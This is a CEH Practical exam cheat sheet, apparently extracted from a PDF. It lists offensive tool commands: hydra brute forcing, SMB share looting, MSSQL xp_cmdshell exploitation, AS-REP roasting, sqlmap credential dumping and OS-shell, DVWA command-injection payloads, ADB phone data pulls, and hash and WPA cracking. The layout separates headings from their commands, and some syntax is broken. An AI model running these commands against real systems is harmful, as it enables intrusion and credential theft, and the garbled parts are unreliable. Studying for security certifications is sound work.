

## CEH PRACTICAL CHEAT SHEET
## Comprehensive Command & Tool Reference Guide
## FILE TRANSFER & DISCOVERY
Sharing Files (Windows ↔ Linux)
Start HTTP server (common across platforms):
Download file on Windows:
Download file on Linux:
## Finding Files
Works natively on both Linux and Windows:
Linux find commands:
Windows search commands:
python3 -m http.server 8080
Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg
wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg
tree
sudo find / -name *.txt
sudo find / -name SpecificFileName.txt
sudo find /DirectoryName -name SpecificFileName.txt
sudo find . -name SpecificFileName.txt
find / -name <filename> -type f 2>/dev/null
dir /b/s <filename*>
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 1
Determine the entropy  - Die Tool
Determine the Parent PID  - Procmon Tool

## RECONNAISSANCE & ENUMERATION
## Server & Domain Controller Identification
Aggressive network scan (save log to file):
Tip:  Use mousepad scan.txt for easy graphical searching and analysis.
Identifying Domain Controllers via common ports:
88/TCP — Kerberos
## 389/TCP — LDAP
If these ports are detected open, execute a deeper aggressive scan against the target to retrieve full Domain
Controller technical details.
## Vulnerability Scanning
Perform an Nmap script-driven vulnerability check:
Alternative GUI suite if Nmap scan yields insufficient results: openVAS
## Directory & Web Research
Enumerate web directories using dictionary attacks:
nmap -A -oN scan.txt <TIP>
## •
## •
nmap -Pn --script vuln <TIP> -T5
dirb <targetDomain> -x eg.txt
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 2

## SERVICE EXPLOITATION & BRUTE FORCING
SMB Enumeration & Exploitation
Crack SMB login credentials:
List SMB network shares:
Access an open share interactively:
Advanced SMB Enumeration via
smbmap:
Download files directly via SMB:
hydra -L users.txt -P pass.txt <TIP> smb -f
smbmap -H <TIP>
smbclient -L <TIP>
smbclient //<TIP>/directory
smbmap -H <IP>
# Attempts guest login if access denied:
smbmap -H <IP> -u guest -p ""
# Authenticated enumeration:
smbmap -H <IP> -u user -p pass
# Inside smbclient:
get <FileName>
# Recursively download via smbmap:
smbmap -H <IP> -u user -p pass -r SHARE
# Download a specific targeted file:
smbmap -H <IP> -u user -p pass --download "SHARE/path/file.txt"
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 3
Tool to Exploit Sql server Vulenrability
Python3 /root/impacket/examples/mssqlclient.py SKILL.CEH.com/LoginName:Password@IP
## -port 1433
SELECT name, CONVERT(INT. ISNULL(value, value_in_use)) AS IsConfigured FROM
sys.configurations WHERE name='xp_cmdshell';
msfconsole  - use exploit/windows/mssql/mssql_payload

## Remote Login & Database Connections
## PROTOCOL /
## SERVICE
## DEFAULT
## PORT
## CONNECTION COMMAND SYNTAX
## SSH22
ssh user@<IP>
Elevate shell: sudo -i (Ref: gtfobins.github.io)
Telnet23telnet <IP>
## RDP (CLI)3389
xfreerdp /v:<TIP> /u:username
GUI Client alternative: remmina
MySQL3306
mysql -u <username> -h <TIP> -p <password>
(Use upper-case -P for custom port specifications)
FTP21ftp <IP>
## RAT9871, 6703
Typically associated with tools like
Theef (Client210.exe)
## Hydra Brute Force Examples
FTP Brute Force:
RDP Brute Force:
SSH on custom port specification:
SNMP Community String Brute Force:
hydra -L users.txt -P passwords.txt ftp://<TIP> -f
hydra -L users.txt -P passwords.txt rdp://<TIP> -f
hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f
hydra -P common-snmp-community-strings.txt target.com snmp
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 4
AS-REP roasting attack
python3 /root/impacket/examples/GetNPUsers.py DomainControllerName/ -no-pass -usersfile users.txt -dc-ip IPAddress
From the target subnet  = 0.0

## Advanced File Retrieval Strategies
RDP Drive Redirection Method
- Create and configure permissions on a dedicated attacker sharing folder:
- Connect while mounting the shareable directory as a network drive:
- Drop files inside the remote machine under
Network Locations / Network Drives mapped directly to
your host folder.
Secure Copy Protocol (SCP) over SSH
Download a specific file:
Download an entire folder directory recursively:
If SSH password authentication is disabled, authenticate directly using a private key:
SMB Folder Multi-Get
To batch download files inside an active
smbclient shell prompt:
mkdir -p /home/attacker/rdp_share
chmod 755 /home/attacker/rdp_share
xfreerdp /v:<TIP> /u:username /p:password /drive:share,/home/attacker/rdp_share
scp user@<TIP>:/path/file.txt newname.txt
scp -r username@<TIP>:/path/to/folder .
scp -i key.pem user@10.10.10.10:/file .
mget *
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 5

## WEB & MOBILE APPLICATION HACKING
SQL Injection (SQLmap)
Retrieve active session cookies directly via browser console:
Full SQLmap automation sequence:
WordPress Security Assessments
Standard vulnerability scan:
Enumerate valid administrative and standard users:
Execute targeted authentication brute-forcing:
document.cookie
# 1. Enumerate databases
sqlmap -u <url> --cookie <cookie_value> --dbs
# 2. Enumerate tables inside selected database
sqlmap -u <url> --cookie <cookie_value> -D dbName --tables
# 3. Dump credentials/data from critical tables
sqlmap -u <url> --cookie <cookie_value> -D dbName -T Users_Login --dump
# 4. Attempt an interactive operating system shell drop
sqlmap -u <url> --cookie <cookie> --os-shell
wpscan -url <domain_or_ip>
wpscan -url <domain_or_ip> -e u
wpscan -url <domain_or_ip> -U user -P pass.txt
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 6
wpscan --url http://www.cehorg.com:8080/CEH/wp-login.php -U username -P rockyou.txt
sqlmap -u <url> --cookie=<cookie_value> --dbs

DVWA Command Execution Payloads
Log in to DVWA, ensure the security level dropdown is toggled to Low, then inject trailing execution tokens:
## Windows Targets:
## Linux Targets:
## Mobile Device Penetration Testing
Scan for exposed Android Debug Bridge interface (Port
## 5555):
Pull full content from the mobile storage card partition:
Automate exploitation suites:
Note: Inside phoneSploit interactive interface options, use
N to access the next configuration index page
and P to return to previous indexes.
| type "path"
| dir "folder/given"
| cat "path"
| type "/path/to/filename"
adb connect <TIP>:5555
adb pull sdcard/
python3 phonesploitpro.py
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 7
To find file inside device:
find / -type d -name (file name) 2>/dev/null
or
find /sdcard -name (file name)
List ELF files:
find Scan -type f
Check whether they are ELF binaries:
file *
Calculate entropy of each ELF:
ent filename
or
binwalk -E filename

## FORENSICS, CRYPTOGRAPHY & TRAFFIC ANALYSIS
## Hash Cracking & Identification
Identify an arbitrary hash signature format:
Execute structured dictionary rules using hashcat:
## MODE PARAMETER (-M)HASH TARGET ARCHITECTURE TYPE
## 0MD5
## 100SHA1
110SHA1 with SALT HASH
## 160HMAC-SHA1
## 900MD4
## 1000NTLM
## 1400SHA256
## 1800SHA512CRYPT
## 3200BCRYPT
Offline multi-threaded cracking alternatives: john or various verified online lookup services.
hash-identifier
Hashcat -a 3 -m 900 -o <output-filename.txt> hash.txt /rockyou.txt
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 8

## Wireless Network (.cap) Decryption
Determine target Access Point BSSID maps from raw wireless sniffing loops:
Crack 4-way WPA handshake captures using specialized dictionary wordlists:
Malware & PE (Portable Executable) Analysis
## Compiler & Packer Info: Use
PEiD to discover structural entry points and linker meta-headers.
Entry Point Address Audits: Use PE Explorer, cross-referencing indicators cleanly inside DIE →
## PE.
Entropy Analysis (Detecting Obfuscation/Packing):
Windows Utility: DIE (Detect It Easy)
Linux Utility: ent
aircrack-ng <filename>.cap
aircrack-ng -w wordlist.txt capture.cap
aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap
## •
## •
## •
## ◦
## ◦
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 9
To Identify the format of the file.
cat Sniff.txt
To inspect the entropy:
strings (file name)
OpenSSL AES-encrypted
openssl enc -d -aes-256-cbc -a -in Sniff.txt -pass pass:<HenryPassword>
If the file is binary
openssl enc -d -aes-256-cbc -in Sniff.txt -pass pass:<HenryPassword>
Ends with = and uses A-Z a-z 0-9 + /  -  Base64
Only 0-9 a-f   -  Hex
Starts with U2FsdGVkX1  -   OpenSSL salted encryption

Starts with -----BEGIN PEM   - (certificate/key)
Starts with Salted__    -   OpenSSL encrypted file
Random printable characters with no pattern Possibly encrypted
Pk...  - ZIP
7zXZ or 7z  -  7z archive
## ZIP
unzip -l Sniff.txt
7z encrypted
7z x Sniff.txt

## Wireshark Deep Packet Filtering
Filter for SYN Flood / Denial of Service (DoS) conditions:
Isolate and locate arbitrary text patterns inside frame data payloads:
Isolate IoT Protocol streams:
Analysis Strategy: Utilize structural analytics pathways via
Statistics → Conversations and
Statistics → I/O Graphs to trace throughput anomalies.
## Encryption, Steganography & Data Encoding
CryptoForge Encrypted Artifacts: File extension types typically resolve to
## .cfe
Integrity Auditing (CRC32/MD5/SHA): Use the automated HashMyFiles.exe engine on Windows, or
standard sha256sum test.txt / algorithmsum <file> loops on Linux architectures.
Steganography Artifact Processing Tools: Use OpenStego or steghide.
Decode text strings via Base64:
Decode stream files directly into binary outputs:
tcp.flags.syn == 1 && tcp.flags.ack == 0
# Alternative broad capture filter:
tcp.flags.syn == 1
frame contains "string"
mqtt
## •
## •
## •
echo "aGVsbG8=" | base64 --decode
echo "aGVsbG8=" | base64 --d
base64 -d Sniff.txt > secret.txt
cat secret.txt
Certified Ethical Hacker (CEH) Practical Cheat SheetPage 10
Base64 → Contains letters, numbers, +, /, and may end with =.
URL encoding → Contains %20, %3A, etc.
Binary → Only 0 and 1.
Hex → Only 0-9 and a-f
Only hex-encoded
echo "48656c6c6f20576f726c64" | xxd -r -p